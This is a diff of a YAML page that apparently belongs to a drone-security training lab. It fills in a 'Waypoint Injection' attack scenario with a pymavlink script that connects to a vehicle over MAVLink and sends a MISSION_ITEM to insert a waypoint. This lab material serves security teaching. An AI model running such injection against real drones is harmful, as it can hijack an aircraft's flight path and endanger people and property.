@@ -1,5 +1,5 @@
 title: Waypoint Injection
-description: Scenario Under development
+description: Inject a new waypoint to the drone's mission using pymavlink.
 breadcrumb:
   - text: Attack Scenarios
     link: /attacks
@@ -9,11 +9,72 @@ breadcrumb:
 sections:
   - title: Description
     content: |
-      <span class="alert-warning">🚧 Scenario Under development</span>
+      Injecting a waypoint to a drone's mission involves sending the `MISSION_ITEM` command to define the new waypoint's coordinates and parameters. This guide demonstrates how to achieve this using pymavlink.
 
   - title: Resources
-    content: []
+    content:
+      - text: pymavlink
+        link: https://pypi.org/project/pymavlink/
 
   - title: Solution Guide
     collapsible: true
-    steps: []
+    steps:
+      - title: Step 1
+        description: | 
+          Install pymavlink.
+
+          ```
+          pip install pymavlink
+          ```
+
+      - title: Step 2
+        description: | 
+          Create a Python script to add a new waypoint. Replace `connection_string`, `latitude`, `longitude`, `altitude`, and other parameters with appropriate values.
+
+          ```
+          from pymavlink import mavutil
+
+          # Replace with your connection string
+          connection_string = 'udp:127.0.0.1:14550'
+
+          # Connect to the vehicle
+          master = mavutil.mavlink_connection(connection_string)
+          master.wait_heartbeat()
+
+          # Define the waypoint parameters
+          seq = 0  # Sequence number
+          frame = mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT
+          command = mavutil.mavlink.MAV_CMD_NAV_WAYPOINT
+          current = 0  # 0: not current, 1: current
+          autocontinue = 1  # 1: autocontinue to next waypoint
+          param1 = 0  # Hold time in decimal seconds
+          param2 = 0  # Acceptance radius in meters
+          param3 = 0  # Pass through the waypoint
+          param4 = 0  # Desired yaw angle
+          latitude = -35.363261  # Degrees
+          longitude = 149.165230  # Degrees
+          altitude = 20  # Meters
+
+          # Send MISSION_ITEM command
+          master.mav.mission_item_send(
+              master.target_system,
+              master.target_component,
+              seq,
+              frame,
+              command,
+              current,
+              autocontinue,
+              param1,
+              param2,
+              param3,
+              param4,
+              latitude,
+              longitude,
+              altitude
+          )
+
+          print(f"Waypoint added: lat={latitude}, lon={longitude}, alt={altitude}")
+          ```
+      - title: Conclusion
+        description: | 
+           This guide provides a step-by-step approach to adding a waypoint to the drone's mission using pymavlink, allowing you to define the coordinates and parameters for the new waypoint.
